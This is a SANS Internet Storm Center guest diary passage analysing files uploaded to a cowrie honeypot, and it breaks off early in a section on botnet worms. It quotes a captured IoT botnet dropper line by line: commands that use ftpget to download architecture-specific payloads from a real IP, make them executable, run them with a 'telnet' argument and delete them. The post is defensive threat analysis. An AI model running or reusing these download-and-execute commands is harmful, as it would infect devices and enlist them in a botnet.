---
title: Exploring Uploads in a Dshield Honeypot Environment &#x5b;Guest Diary&#x5d;, (Thu, Sep 18th)
url: https://isc.sans.edu/diary/rss/32296
source: SANS Internet Storm Center, InfoCON: green
date: 2025-09-19
fetch_date: 2025-10-02T20:23:34.195020
---

# Exploring Uploads in a Dshield Honeypot Environment &#x5b;Guest Diary&#x5d;, (Thu, Sep 18th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Jesse La Grew](/handler_list.html#jesse-la-grew "Jesse La Grew")

Threat Level: [green](/infocon.html)

* [previous](/diary/32294)
* [next](/diary/32302)

# [Exploring Uploads in a Dshield Honeypot Environment [Guest Diary]](/forums/diary/Exploring%2BUploads%2Bin%2Ba%2BDshield%2BHoneypot%2BEnvironment%2BGuest%2BDiary/32296/)

**Published**: 2025-09-18. **Last Updated**: 2025-09-18 00:49:09 UTC
**by** [Guy Bruneau](/handler_list.html#guy-bruneau) (Version: 1)

[0 comment(s)](/diary/Exploring%2BUploads%2Bin%2Ba%2BDshield%2BHoneypot%2BEnvironment%2BGuest%2BDiary/32296/#comments)

[This is a Guest Diary by Nathan Smisson, an ISC intern as part of the SANS.edu [BACS](https://www.sans.edu/cyber-security-programs/bachelors-degree/) program]

The goal of this project is to test the suitability of various data entry points within the dshield ecosystem to determine which metrics are likely to yield consistently interesting results.  This article explores analysis of files uploaded to the cowrie honeypot server.  Throughout this project, a number of tools have been developed to aid in improving workflow efficiency for analysts conducting research using a cowrie honeypot.  Here, a relatively simple tool called **upload-stats** is used to enumerate basic information about the files in the default cowrie ‘downloads’ directory at /srv/cowrie/var/lib/cowrie/downloads.  This and other tools developed in this project are available for use or contribution at <https://github.com/neurohypophysis/dshield-tooling>.

The configuration of my honeypot is intentionally very typical, closely following the installation and setup guide on <https://github.com/DShield-ISC/dshield/tree/main>.  The node in use for the purposes of this article is was set up on an EC2 instance in the AWS us-east-1 zone, which is old and very large, even by AWS standards.

**Part 1: Identified Shell Script Investigation**

The upload-stats tool works by enumerating some basic information about the files present in the downloads directory and printing it along with any corresponding information discovered in the honeypot event logs.  If the logs are still present on the system, it will automatically identify information such as source IP, time of upload, and other statistics that can aid in further exploration of interesting-looking files.
Given no arguments, the tool produces a quick summary of the files available on the system:

![](https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic1.png)

In this case, 21 of the files are reported as empty; if you’re following along, you may notice that the names of many such empty files are something short like tmp5wtvcehx.  When an upload is started, cowrie creates a temporary file, populates it with the contents of the uploaded file, and then renames it to the SHA hash of the result.  For empty files with temporary placeholder names, that likely means that the upload failed for some reason.

Among the top file types provided, we have a single file that was identified by the UNIX file utility as a Bash script.  As it turns out, this was not the only shell script among the files present in the directory at the time this command was run.  The reason that only one of them was identified as a shell script will be explored later in this article.  First, let’s take a look at the outlier.  Luckily it’s relatively short, so I can include the contents of the entire script here.

![](https://isc.sans.edu/diaryimages/images/Nathan_Smisson_pic2.png)

Fortunately for us, this script is very repetitive and easy to read, so let’s go line by line for one iteration of the pattern (which, I might add, could be much more concise had the actor used a for loop).

**Line 1**
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;

Each line of the script begins by attempting to change to several directories (cd /tmp || cd /var/run || cd /mnt || cd /root || cd /). This fallback sequence suggests a preference for a writable, low-monitoring location first (/tmp) and will attempt alternative directories only if prior ones fail, with the file root as a last resort.

**Line 2**
ftpget -v -u anonymous -p anonymous -P 21 87.121.84.163 arm5 arm5;

What follows is a command to download an architecture-specific payload from the actor’s FTP server.  More specifically, the script as a whole, if executed (and assuming we have ftpget installed, which we do not) will download payloads for 14 different architectures, casting a pretty wide net.  The inclusion of the -v (verbose) switch indicates that the actor expects, or at least hopes for non-blind RCE in this context, though we can assume FTP server accesses from the victim would be visible to the actor if execution succeeded, regardless.

To be thorough, here are the targeted CPU architecture variants:
•    mips, mipsel (MIPS variants)
•    sh4 (SuperH architecture)
•    x86\_64 (64-bit Intel/AMD)
•    arm6, arm, arm5, arm7 (various ARM versions)
•    i686, x86 (32-bit Intel/AMD)
•    powerpc, ppc4fp (PowerPC variants)
•    m68k (Motorola 68k series)
•    spc (Ambiguous; may refer to SPC-700, among others.  I’d have to ask the author of the malware for clarification)

An interesting list, to be sure.  After researching some of the more obscure variants, the underlying commonality seems to be targeting IoT/embedded/OT devices or (likely legacy) networking equipment.  It’s hard to say anything beyond that for certain, though many of these have much more limited applications than others (e.g., SuperH, Motorola 68000 series, and SPC vs x86\_64).  Notably absent are any Apple chips or many of the modern chips used in Android handsets.  Given the types of devices used with some of these specialized hardware sets, the final payload is unlikely to attempt anything involving a heavy workload.
I also noted the use of the old plaintext FTP for payload transfer: old becomes new again.

**Line 3**
chmod 777 arm5 ./arm5 telnet

This step changes the permissions of the downloaded payload to executable and then executes it with the argument ‘telnet’, which I’m guessing indicates the intended backdoor method.  Note that the script as received will attempt to execute all of the downloaded payloads, meaning that any environment discovery likely happens at this step, and only the payload corresponding to the compromised host’s chip architecture will successfully execute.

**Line 4**
rm -rf arm5

Finally, the payload is removed, possibly indicating that a persistence mechanism has been installed with the previous step, and more obviously indicating a desire to leave slightly fewer forensic artifacts on the target system.

**Second-Stage Payload Server Analysis**

The address 87.121.84.163 did not appear in any of the other uploaded files.  It appeared in several IP reputation blocklists as reported by Speedguide and Talos, though the referenced database at spamhaus.org did not return any immediately visible results.  At any rate, the RIPE records have the /24 netblock registered to an AS owned by a Dutch VPS provider, VPSVAULTHOST, which looks like it’s operating in the UK.  I’m assuming it’s a cloud-hosted server.  Interestingly, the ISC page has the country listed as Bulgaria, though I didn’t see anything else pointing there in my search.  Nothing else is reported on the ISC website.

Unfortunately, I have no other records of the source of this attack directly.  87.121.84.163 also did not appear in any other records, which is expected considering its role in the attack as a payload server.  In the next section, we will see instances of honeypot uploads with associated log entries, allowing for a more complete picture of an attack origin and life cycle.

**Part 2: Botnet Worm Discovery**

Continuing the investigation of patterns in uploaded files, I noticed that all of the file types identified by the system as ‘data’ appear to be readable text.  In the earlier bash...